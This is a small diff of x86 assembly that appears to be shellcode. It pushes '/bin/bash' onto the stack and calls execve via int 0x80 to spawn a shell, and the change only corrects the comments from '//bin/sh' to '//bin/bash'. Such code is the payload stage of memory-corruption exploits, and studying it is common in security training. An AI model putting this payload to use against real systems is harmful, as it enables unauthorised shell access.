@@ -140,11 +140,11 @@ _start:
 	push dword 0x7361622f		; sab/
 	push dword 0x6e69622f		; nib/
 
-	mov ebx, esp			; const char *pathname => *"//bin/sh"
+	mov ebx, esp			; const char *pathname => *"//bin/bash"
 	xor eax, eax
 	push eax
 	mov edx, esp			; char *const envp[] => NULL
 	push ebx,
-	mov ecx, esp			; char *const argv[] => *{*"//bin/sh"}
+	mov ecx, esp			; char *const argv[] => *{*"//bin/bash"}
 	mov al, 0xb			; SYS_EXECVE = 0xb
 	int 0x80
